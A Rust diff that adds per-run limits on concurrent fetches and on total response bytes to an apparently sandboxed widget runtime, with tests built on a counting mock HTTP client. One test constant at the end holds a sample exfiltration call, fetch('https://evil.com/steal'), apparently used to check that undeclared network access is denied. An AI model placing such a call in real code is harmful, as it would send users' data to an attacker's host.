@@ -8,7 +8,7 @@ mod permissions;
 use std::future::Future;
 use std::path::PathBuf;
 use std::pin::Pin;
-use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
 use std::sync::{Arc, Mutex};
 use std::time::{Duration, Instant};
 
@@ -96,6 +96,10 @@ pub const OUTPUT_MAX_BYTES: usize = 128 * 1024;
 /// `RunError` messages are cut to this many characters (they end up in the
 /// log and in tooltips).
 pub const ERROR_MAX_CHARS: usize = 300;
+/// Most fetches one run may have in flight; the rest wait.
+pub const FETCH_MAX_IN_FLIGHT: usize = 4;
+/// Total response bytes one run may receive.
+pub const FETCH_BUDGET_BYTES: usize = 8 * 1024 * 1024;
 /// Log target of widget `console.log` / `log` lines.
 pub const WIDGET_LOG_TARGET: &str = "perchbar::widget";
 
@@ -224,15 +228,34 @@ fn install_fetch<'js>(
     allowed: Vec<String>,
     violation: Violation,
 ) -> rquickjs::Result<()> {
+    // Per run (each run installs fetch into a fresh context): a cap on
+    // requests in flight and on the total response bytes.
+    let in_flight = Arc::new(tokio::sync::Semaphore::new(FETCH_MAX_IN_FLIGHT));
+    let received = Arc::new(AtomicUsize::new(0));
     let fetch = Function::new(
         ctx.clone(),
         Async(move |ctx: Ctx<'js>, req: String| {
             let http = http.clone();
             let allowed = allowed.clone();
             let violation = violation.clone();
+            let in_flight = in_flight.clone();
+            let received = received.clone();
             async move {
+                let over_budget = || {
+                    Exception::throw_message(
+                        &ctx,
+                        "fetch failed: Perchbar: this run received more than 8 MB of responses",
+                    )
+                };
                 let req: HttpRequest = serde_json::from_str(&req)
                     .map_err(|e| Exception::throw_type(&ctx, &format!("fetch: {e}")))?;
+                let _permit = in_flight
+                    .acquire()
+                    .await
+                    .map_err(|_| Exception::throw_message(&ctx, "fetch: closed"))?;
+                if received.load(Ordering::Relaxed) >= FETCH_BUDGET_BYTES {
+                    return Err(over_budget());
+                }
                 let resp = match send(http.as_ref(), req, &allowed).await {
                     Ok(resp) => resp,
                     Err(SendError::Denied(msg)) => {
@@ -247,6 +270,11 @@ fn install_fetch<'js>(
                         ));
                     }
                 };
+                let total = received.fetch_add(resp.body.len(), Ordering::Relaxed)
+                    + resp.body.len();
+                if total > FETCH_BUDGET_BYTES {
+                    return Err(over_budget());
+                }
                 serde_json::to_string(&resp)
                     .map_err(|e| Exception::throw_message(&ctx, &format!("fetch: {e}")))
             }
@@ -639,6 +667,85 @@ mod tests {
         assert!(target.starts_with("perchbar"));
         assert_eq!(*level, log::Level::Info);
         assert_eq!(msg, "[inst-1] marker-7f3a 42");
+    }
+
+    /// Counts concurrent requests and bytes served; every response is a
+    /// body of `body_len` bytes after a short delay.
+    struct CountingHttp {
+        body_len: usize,
+        active: std::sync::atomic::AtomicUsize,
+        max_active: std::sync::atomic::AtomicUsize,
+        requests: std::sync::atomic::AtomicUsize,
+        bytes: std::sync::atomic::AtomicUsize,
+    }
+
+    impl CountingHttp {
+        fn new(body_len: usize) -> Arc<CountingHttp> {
+            Arc::new(CountingHttp {
+                body_len,
+                active: Default::default(),
+                max_active: Default::default(),
+                requests: Default::default(),
+                bytes: Default::default(),
+            })
+        }
+    }
+
+    impl HttpClient for CountingHttp {
+        fn send(&self, _req: HttpRequest) -> HttpFuture<'_> {
+            use std::sync::atomic::Ordering::SeqCst;
+            Box::pin(async move {
+                self.requests.fetch_add(1, SeqCst);
+                let now = self.active.fetch_add(1, SeqCst) + 1;
+                self.max_active.fetch_max(now, SeqCst);
+                tokio::time::sleep(Duration::from_millis(30)).await;
+                self.active.fetch_sub(1, SeqCst);
+                self.bytes.fetch_add(self.body_len, SeqCst);
+                Ok(HttpResponse {
+                    status: 200,
+                    headers: Vec::new(),
+                    body: "a".repeat(self.body_len),
+                })
+            })
+        }
+    }
+
+    #[tokio::test]
+    async fn at_most_four_fetches_in_flight_per_run() {
+        use std::sync::atomic::Ordering::SeqCst;
+        let http = CountingHttp::new(2);
+        let mut f = Fixture::new(&returning(
+            "await (async () => { const all = []; \
+             for (let i = 0; i < 12; i++) all.push(fetch(\"https://api.example.com/\" + i)); \
+             const rs = await Promise.all(all); return rs.filter(r => r.ok).length; })()",
+        ));
+        f.network = vec!["api.example.com".into()];
+        f.http = Some(http.clone());
+        assert_eq!(text(&f.run().await.unwrap()), "12");
+        assert_eq!(http.requests.load(SeqCst), 12);
+        assert_eq!(http.max_active.load(SeqCst), FETCH_MAX_IN_FLIGHT);
+    }
+
+    #[tokio::test]
+    async fn response_bytes_over_8mb_per_run_fail_the_fetch() {
+        use std::sync::atomic::Ordering::SeqCst;
+        let http = CountingHttp::new(3 * 1024 * 1024);
+        let mut f = Fixture::new(&returning(
+            "await (async () => { const out = []; for (let i = 0; i < 4; i++) { \
+             try { const r = await fetch(\"https://api.example.com/\" + i); \
+             out.push((await r.text()).length > 0 ? \"ok\" : \"empty\"); } \
+             catch (e) { out.push(e.message.includes(\"more than 8 MB\") ? \"budget\" : e.message); } }              return out.join(\"|\"); })()",
+        ));
+        f.network = vec!["api.example.com".into()];
+        f.http = Some(http.clone());
+        f.limits.memory_bytes = 64 * 1024 * 1024;
+        let out = f.run().await.unwrap();
+        let parts: Vec<&str> = text(&out).split('|').collect();
+        assert_eq!(parts[..2], ["ok", "ok"], "{}", text(&out));
+        assert_eq!(parts[2..], ["budget", "budget"], "{}", text(&out));
+        // The fourth fetch is refused without a request.
+        assert_eq!(http.requests.load(SeqCst), 3);
+        assert!(http.bytes.load(SeqCst) <= 9 * 1024 * 1024);
     }
 
     const UNDECLARED_FETCH: &str = "await fetch(\"https://evil.com/steal\")";
